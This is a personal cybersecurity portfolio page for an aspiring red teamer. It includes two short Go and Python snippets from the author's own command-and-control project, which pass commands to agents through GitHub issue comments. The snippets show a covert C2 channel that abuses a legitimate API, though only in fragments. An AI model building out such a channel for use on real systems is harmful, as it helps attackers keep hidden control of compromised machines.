---
layout: default
---

# Siva G - (Aspiring)Cybersecurity Professional

Welcome to my personal GitHub page! I'm **Siva G**, a cybersecurity master's graduate passionate about **red teaming, ICS/SCADA security, and military cybersecurity**. My work blends **digital forensics, threat hunting, and offensive security** to create innovative solutions.

## About Me

I'm currently focused on specializing in **cybersecurity operations, red teaming, and ICS/SCADA security**. My goal is to secure a well-paying role in the field with a strong work-life balance and ever curious peers. I also have a keen interest in **developing a robust C2 framework using Rust, Python, Golang, and Discord**.

> "Не шагу назад" *(Not a step back)*
>
> Cybersecurity is more than a profession; it's a battlefield where only the strongest and smartest thrive.

## My Interests

- **Red Teaming & Exploitation**: Passionate about offensive security and developing C2 frameworks.
- **ICS/SCADA Security**: Securing industrial control systems against cyber threats.
- **Fitness & Adventure**: Swimming, running, and self-defence.

### My Projects

```go
//actual snippet from the agent.go
func executeCommands() {
	for {
		url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "token "+githubToken)
		req.Header.Set("Accept", "application/vnd.github.v3+json")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			log.Println("❌ Failed to fetch commands:", err)
			continue
		}
		defer resp.Body.Close()
```

```python
#Also an actual code snippet from app.py
def submit():
    data = request.get_json()
    agent_id = data.get("agent")
    command = data.get("message")

    if not agent_id or not command:
        return jsonify({"error": "Invalid request"}), 400

    response = requests.post(
        f"https://api.github.com/repos/{GITHUB_REPO}/issues/{agent_id}/comments",
        json={"body": f"Command: {command}"},
        headers=HEADERS
    )

    if response.status_code == 201:
        return jsonify({"success": "Command submitted"}), 200
    return jsonify({"error": "Failed to send command"}), 500
```

## Tools & Technologies

| Category       | Tools & Skills                          |
|:--------------|:---------------------------------|
| Programming   | Rust, Python, Go, Bash         |
| Security      | Red Teaming, Threat Hunting    |
| Forensics     | Sleuthkit, YARA, Volatility    |
| Cloud         | Azure (AZ900, AZ500)      |
| OS           | Kali Linux      |

## My Vision

**Cybersecurity** is a never-ending chess game, and I aim to stay **several moves ahead**. Whether it's **securing industrial control systems** or **outmaneuvering adversaries in the digital battlefield**, my mission is to **test** the **boundaries of my limits**—preferably with a **strong cup of coffee** and an **optimized terminal setup**.

## Contact Me

- **GitHub**: [CaptShiva007](https://github.com/captshiva007)
- **LinkedIn**: [Siva G](https://linkedin.com/in/captshiva007)
- **Email**: [shivasepicjourney@gmail.com](mailto:shivasepicjourney@gmail.com)


---

*This page is constantly evolving. Stay tuned for more updates!*

